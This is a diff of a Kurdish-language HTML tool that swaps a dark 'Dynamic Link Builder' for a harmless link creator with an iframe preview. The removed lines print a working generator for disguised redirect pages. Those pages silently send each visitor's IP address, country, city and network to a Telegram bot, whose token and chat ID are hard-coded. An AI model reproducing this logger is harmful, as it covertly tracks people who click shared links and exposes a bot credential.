@@ -1,175 +1,416 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html dir="rtl" lang="ku">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dynamic Link Builder</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>لینک دروستکەر و بینەر</title>
     <style>
-        body {
+        * {
+            box-sizing: border-box;
             margin: 0;
-            background: #0f172a;
-            color: #f8fafc;
-            font-family: Arial, sans-serif;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f4f8;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
-            align-items: center;
-            height: 100vh;
+            align-items: flex-start;
+            padding: 30px 20px;
         }
-        .card {
-            background: #1e293b;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+
+        .container {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.12);
+            max-width: 1100px;
             width: 100%;
-            max-width: 450px;
+            padding: 35px 30px;
         }
-        h2 {
-            margin-top: 0;
-            font-size: 20px;
+
+        h1 {
+            font-size: 28px;
+            color: #0f172a;
             text-align: center;
-            color: #38bdf8;
-        }
-        label {
-            display: block;
             margin-bottom: 6px;
-            font-size: 13px;
-            color: #cbd5e1;
         }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 12px;
-            background: #0f172a;
-            border: 1px solid #334155;
-            color: #fff;
-            border-radius: 6px;
-            box-sizing: border-box;
+
+        .subtitle {
+            text-align: center;
+            color: #64748b;
+            margin-bottom: 28px;
+            font-size: 15px;
         }
-        .info-box {
-            background: #090d16;
-            padding: 10px;
-            border-radius: 6px;
-            border: 1px dashed #334155;
-            font-size: 12px;
+
+        /* بەشی دروستکردنی لینک */
+        .create-section {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 25px 22px;
+            border: 1.5px solid #e2e8f0;
+            margin-bottom: 25px;
+        }
+
+        .create-section h3 {
+            font-size: 18px;
+            color: #0f172a;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .create-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .create-row label {
+            font-weight: 600;
+            color: #334155;
+            font-size: 14px;
+            min-width: 70px;
+        }
+
+        .create-row input[type="text"] {
+            flex: 1;
+            min-width: 180px;
+            padding: 10px 16px;
+            border-radius: 12px;
+            border: 1.5px solid #cbd5e1;
+            font-size: 15px;
+            outline: none;
+            transition: 0.25s;
+            background: white;
+        }
+
+        .create-row input[type="text"]:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+        }
+
+        .create-row input[type="text"]::placeholder {
             color: #94a3b8;
-            margin-bottom: 15px;
-            word-break: break-all;
         }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #0284c7;
+
+        .btn-create {
+            background: #2563eb;
             color: white;
             border: none;
-            border-radius: 6px;
+            padding: 10px 30px;
+            border-radius: 12px;
+            font-weight: 700;
             font-size: 15px;
             cursor: pointer;
-            font-weight: bold;
+            transition: 0.2s;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        button:hover {
-            background: #0369a1;
+
+        .btn-create:hover {
+            background: #1d4ed8;
+            transform: scale(1.02);
         }
-        textarea {
+
+        .btn-create:active {
+            transform: scale(0.97);
+        }
+
+        /* بەشی لینکی چالاک */
+        .active-link-box {
+            background: #eef2ff;
+            border-radius: 12px;
+            padding: 14px 20px;
+            margin: 10px 0 20px 0;
+            border: 1px solid #c7d2fe;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .active-link-box strong {
+            color: #1e293b;
+            font-size: 14px;
+        }
+
+        .active-link-box .link-url {
+            color: #1d4ed8;
+            font-size: 14px;
+            word-break: break-all;
+            flex: 1;
+            background: white;
+            padding: 6px 14px;
+            border-radius: 8px;
+            border: 1px solid #bfdbfe;
+        }
+
+        .btn-open {
+            background: #16a34a;
+            color: white;
+            border: none;
+            padding: 8px 22px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+
+        .btn-open:hover {
+            background: #15803d;
+        }
+
+        .btn-clear {
+            background: #e2e8f0;
+            color: #1e293b;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+
+        .btn-clear:hover {
+            background: #cbd5e1;
+        }
+
+        /* بەشی پیشاندانی وێبسایت (ئایفڕەیم) */
+        .iframe-wrapper {
+            margin-top: 20px;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid #e2e8f0;
+            background: #f1f5f9;
+            position: relative;
+        }
+
+        .iframe-wrapper iframe {
             width: 100%;
-            height: 90px;
-            background: #0f172a;
-            border: 1px solid #334155;
-            color: #34d399;
-            border-radius: 6px;
-            padding: 10px;
-            margin-top: 15px;
-            box-sizing: border-box;
-            font-family: monospace;
-            font-size: 11px;
+            height: 550px;
+            border: none;
+            display: block;
+            background: white;
+        }
+
+        .iframe-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 450px;
+            color: #94a3b8;
+            background: #f8fafc;
+            text-align: center;
+            padding: 30px;
+        }
+
+        .iframe-placeholder .icon {
+            font-size: 60px;
+            margin-bottom: 16px;
+        }
+        .iframe-placeholder p {
+            font-size: 17px;
+            max-width: 400px;
+        }
+
+        .footer-note {
+            margin-top: 18px;
+            font-size: 13px;
+            color: #94a3b8;
+            text-align: center;
+        }
+
+        /* وەڵامدانەوە */
+        @media (max-width: 650px) {
+            .container { padding: 20px 15px; }
+            .create-row { flex-direction: column; align-items: stretch; }
+            .create-row label { min-width: auto; }
+            .btn-create { justify-content: center; }
+            .active-link-box { flex-direction: column; align-items: stretch; }
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>🔗 دروستکەری لینک و بینەری وێبسایت</h1>
+        <p class="subtitle">لینکی خۆت دابنە، ناوی لینکەکە بنوسە، کلیکی دروستکردن بکە، پاشان وێبسایتەکە ببینە</p>
 
-    <div class="card">
-        <h2>Dynamic Link Builder</h2>
-        
-        <label>سەرەتا هۆستەکەت (Base URL):</label>
-        <input type="text" id="baseUrl" value="https://nex-talk-mocha.vercel.app/" oninput="updatePreview()">
+        <!-- بەشی دروستکردن -->
+        <div class="create-section">
+            <h3>📝 لینکی نوێ دروست بکە</h3>
+            <div class="create-row">
+                <label>لینک (URL):</label>
+                <input type="text" id="urlInput" placeholder="https://example.com" value="https://example.com" />
+                
+                <label>ناو (تایتڵ):</label>
+                <input type="text" id="titleInput" placeholder="ناوی لینکەکە..." value="ماڵپەڕی نموونە" />
+                
+                <button class="btn-create" id="createBtn">✨ دروستکردن</button>
+            </div>
+        </div>
 
-        <label>لینکی مەبەست (بۆ نموونە ڤیدیۆی تیکتۆک):</label>
-        <input type="text" id="targetUrl" value="https://vt.tiktok.com/ZSq8oHq1e/" oninput="updatePreview()">
+        <!-- بەشی لینکی چالاک -->
+        <div class="active-link-box" id="activeLinkBox">
+            <strong>🔗 لینکی چالاک:</strong>
+            <span class="link-url" id="activeLinkDisplay">هێشتا لینکێک دروست نەکراوە</span>
+            <button class="btn-open" id="openBtn">🚀 کردنەوە</button>
+            <button class="btn-clear" id="clearBtn">🗑️ پاککردنەوە</button>
+        </div>
 
-        <label>لینکی کۆتایی تێکەڵکراو (Dynamic Link):</label>
-        <div class="info-box" id="previewLink">https://nex-talk-mocha.vercel.app/?to=https://vt.tiktok.com/ZSq8oHq1e/</div>
+        <!-- بەشی پیشاندانی وێبسایت -->
+        <div class="iframe-wrapper" id="iframeWrapper">
+            <!-- ئەمە دەبێتە شوێنی ئایفڕەیم یان پلەیس هۆڵدەر -->
+            <div class="iframe-placeholder" id="placeholder">
+                <div class="icon">🌐</div>
+                <p>لینکێک دروست بکە بۆ بینینی وێبسایتەکە لەم بۆشاییدا</p>
+                <p style="font-size:14px; color:#b0b8c4;">ئەتوانیت هەر لینکێک (HTTP/HTTPS) بەکاربهێنیت</p>
+            </div>
+            <iframe id="previewIframe" style="display:none;" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+        </div>
 
-        <button onclick="generateCode()">دروستکردنی کۆدی index.html</button>
-
-        <textarea id="outputCode" readonly placeholder="کۆدی پەڕەی هۆست لێرە دەردەکەوێت..."></textarea>
+        <p class="footer-note">
+            ✅ لینکەکەت دروست بکە، پاشان کلیکی «کردنەوە» بکە بۆ بینینی وێبسایتەکە لە هەمان پەڕەدا.
+        </p>
     </div>
 
     <script>
-        const BOT_TOKEN = '8942095399:AAGbL8-6mj89o3PefyQeVdRd9oVR0LrSNDg';
-        const CHAT_ID = '7641255924';
+        (function() {
+            // گرتنی ئێلێمێنتەکان
+            const urlInput = document.getElementById('urlInput');
+            const titleInput = document.getElementById('titleInput');
+            const createBtn = document.getElementById('createBtn');
+            const openBtn = document.getElementById('openBtn');
+            const clearBtn = document.getElementById('clearBtn');
+            const activeLinkDisplay = document.getElementById('activeLinkDisplay');
+            const placeholder = document.getElementById('placeholder');
+            const previewIframe = document.getElementById('previewIframe');
 
-        function updatePreview() {
-            let base = document.getElementById('baseUrl').value.trim();
-            let target = document.getElementById('targetUrl').value.trim();
-            
-            // دڵنیابوون لەوەی هۆستەکە `/` تێدایە
-            if(!base.endsWith('/')) base += '/';
+            // شوێنی هەڵگرتنی لینکی دروستکراو
+            let currentLink = {
+                url: '',
+                title: ''
+            };
 
-            let finalDynamicLink = base + "?to=" + encodeURIComponent(target);
-            document.getElementById('previewLink').innerText = finalDynamicLink;
-        }
+            // فەنکشن بۆ پیشاندانی لینک لە بۆکسی چالاک
+            function updateActiveLinkDisplay() {
+                if (currentLink.url && currentLink.title) {
+                    activeLinkDisplay.textContent = `${currentLink.title} — ${currentLink.url}`;
+                } else if (currentLink.url) {
+                    activeLinkDisplay.textContent = currentLink.url;
+                } else {
+                    activeLinkDisplay.textContent = 'هێشتا لینکێک دروست نەکراوە';
+                }
+            }
 
-        function generateCode() {
-            let target = document.getElementById('targetUrl').value.trim();
+            // فەنکشن بۆ کردنەوەی لینک لە ئایفڕەیمدا
+            function openLinkInIframe(url) {
+                if (!url || url.trim() === '') {
+                    alert('تکایە سەرەتا لینکێک دروست بکە!');
+                    return;
+                }
 
-            const finalCode = `<!DOCTYPE html>
-<html lang="en" dir="ltr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-</head>
-<body>
-    <script>
-        const BOT_TOKEN = '${BOT_TOKEN}';
-        const CHAT_ID = '${CHAT_ID}';
-        
-        // وەرگرتنی لینکی مەبەست لە پارامێتەری 'to' یان بە شێوەی جێگیر
-        const urlParams = new URLSearchParams(window.location.search);
-        let targetUrl = urlParams.get('to') || '${target}';
+                // دڵنیابوون لەوەی کە لینکەکە بە http یان https دەست پێدەکات
+                let finalUrl = url.trim();
+                if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
+                    finalUrl = 'https://' + finalUrl;
+                }
 
-        async function sendIPAndRedirect() {
-            try {
-                let res = await fetch('https://ipapi.co/json/');
-                let data = await res.json();
-                
-                let ipMessage = "🌐 New Visitor Info:\\n\\n" +
-                                "IP: " + data.ip + "\\n" +
-                                "Country: " + data.country_name + "\\n" +
-                                "City: " + data.city + "\\n" +
-                                "Org: " + data.org;
+                // پیشاندانی ئایفڕەیم و شاردنەوەی پلەیس هۆڵدەر
+                placeholder.style.display = 'none';
+                previewIframe.style.display = 'block';
+                previewIframe.src = finalUrl;
+            }
 
-                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: ipMessage
-                    })
-                });
-            } catch (e) {}
+            // فەنکشنی دروستکردنی لینک
+            function createLink() {
+                const url = urlInput.value.trim();
+                const title = titleInput.value.trim();
 
-            window.location.href = targetUrl;
-        }
+                if (!url) {
+                    alert('تکایە لینکێک (URL) بنوسە!');
+                    return;
+                }
 
-        window.onload = sendIPAndRedirect;
-    <\/script>
-</body>
-</html>`;
+                // هەڵگرتنی لینکەکە
+                currentLink.url = url;
+                currentLink.title = title || url; // ئەگەر ناو نەبێت، خودی لینکەکە دەبێتە ناو
 
-            document.getElementById('outputCode').value = finalCode;
-        }
+                // نوێکردنەوەی پیشاندان
+                updateActiveLinkDisplay();
 
-        updatePreview();
+                // بە شێوەی ئۆتۆماتیکی لینکەکە لە ئایفڕەیمدا بکەرەوە
+                openLinkInIframe(url);
+
+                // پیامی سەرکەوتن
+                // (دەتوانیت لە کۆنسۆل یان بە ئاگادارکردنەوە)
+            }
+
+            // فەنکشن بۆ کردنەوەی لینکی چالاک
+            function openActiveLink() {
+                if (currentLink.url) {
+                    openLinkInIframe(currentLink.url);
+                } else {
+                    alert('تکایە سەرەتا لینکێک دروست بکە!');
+                }
+            }
+
+            // فەنکشن بۆ پاککردنەوەی هەموو شتێک
+            function clearAll() {
+                // پاککردنەوەی زانیارییەکان
+                currentLink.url = '';
+                currentLink.title = '';
+                updateActiveLinkDisplay();
+
+                // گەڕانەوە بۆ پلەیس هۆڵدەر
+                previewIframe.style.display = 'none';
+                previewIframe.src = '';
+                placeholder.style.display = 'flex';
+
+                // خاڵیکردنەوەی فۆرمەکان (بەڵام نرخی پێشتر دەهێڵینەوە یان بەتاڵ دەکەین)
+                // ئەتوانیت بەتاڵیان بکەیت یان نەکەیت
+                // بۆ ئاسانی، تەنها بەتاڵی ناکەین تا خەڵک بتوانێت دووبارە بەکاربهێنێت
+            }
+
+            // ڕووداوەکان
+            createBtn.addEventListener('click', createLink);
+
+            openBtn.addEventListener('click', openActiveLink);
+
+            clearBtn.addEventListener('click', clearAll);
+
+            // کەسپتەر: کەوتنە سەر کلیلی Enter لە فۆرمەکاندا
+            urlInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    createLink();
+                }
+            });
+            titleInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    createLink();
+                }
+            });
+
+            // کاتێک پەڕە بار دەبێت، لینکی نموونەیی دروست بکە
+            window.addEventListener('DOMContentLoaded', function() {
+                // بە شێوەی ئۆتۆماتیکی لینکی یەکەم دروست بکە
+                // بۆ ئەوەی بەکارهێنەر یەکسەر ببینێت کە کار دەکات
+                createLink();
+            });
+
+        })();
     </script>
 </body>
 </html>
